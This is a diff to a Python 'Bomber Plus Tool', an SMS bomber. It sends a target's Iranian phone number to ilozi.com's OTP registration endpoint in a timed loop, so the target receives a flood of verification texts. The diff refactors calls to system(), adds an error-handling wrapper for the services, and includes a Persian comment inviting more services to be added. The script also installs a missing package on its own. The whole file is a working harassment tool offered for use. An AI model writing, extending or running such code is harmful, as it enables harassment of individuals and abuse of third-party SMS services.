@@ -1,5 +1,7 @@
-from platform import node, system, release; Node, System, Release = node(), system(), release()
-from os import system, name; system('clear' if name == 'posix' else 'cls')
+from platform import node, system, release
+Node, System, Release = node(), system(), release()
+from os import system as sys_system, name
+sys_system('clear' if name == 'posix' else 'cls')
 from re import match, sub
 from threading import Thread
 import urllib3; urllib3.disable_warnings()
@@ -11,7 +13,7 @@ import socket
 try:
     from requests import get, post
 except ImportError:
-    system("python3 -m pip install requests")
+    sys_system("python3 -m pip install requests")
 
 # Colors
 r = '\033[31;1m'  
@@ -41,12 +43,10 @@ def check_internet():
 # ------------------------------
 # SMS services
 # ------------------------------
-
-
 def ilozi(phone):
     url = "https://ilozi.com/wp-json/digits/v1/send_otp"
     payload = {
-        "digits_reg_mobile": "0" + phone.split("+98")[1],  # شماره با صفر شروع
+        "digits_reg_mobile": "0" + phone.split("+98")[1],
         "digits_reg_countrycode": "98",
         "type": "register"
     }
@@ -71,12 +71,16 @@ def ilozi(phone):
         print(f'{r}[!] ilozi Exception: {e}{a}')
         return False
 
-
+# تابع کمکی برای اجرای سرویس‌ها با مدیریت خطا
+def send_service_safe(service, phone):
+    try:
+        service(phone)
+    except Exception as e:
+        print(f"{r}[!] {service.__name__} Exception: {e}{a}")
 
 # Simple SMS bomber
 def Vip(phone, Time):
-    services = [
-    ilozi ]
+    services = [ilozi]  # اینجا می‌تونید سرویس‌های جدید اضافه کنید
     total_services = len(services)
     
     print_slow(f"{p}╔═════[ SMS Bombing Initiated ]═════╗")
@@ -93,7 +97,7 @@ def Vip(phone, Time):
                 sleep(Time)
     except KeyboardInterrupt:
         print_slow(f"{g}[+] {y}Mission Completed!")
-        system('clear' if name == 'posix' else 'cls')  
+        sys_system('clear' if name == 'posix' else 'cls')  
 
 # Phone validation
 def is_phone(phone: str):
@@ -103,7 +107,7 @@ def is_phone(phone: str):
 
 # Menu
 def main_menu():
-    system('clear' if name == 'posix' else 'cls')
+    sys_system('clear' if name == 'posix' else 'cls')
     print_slow(f"""
 {p}╔════════════════════════════════════════════════════╗
 {b}║              ⟬ Bomber Plus Tool (Fixed) ⟭          ║
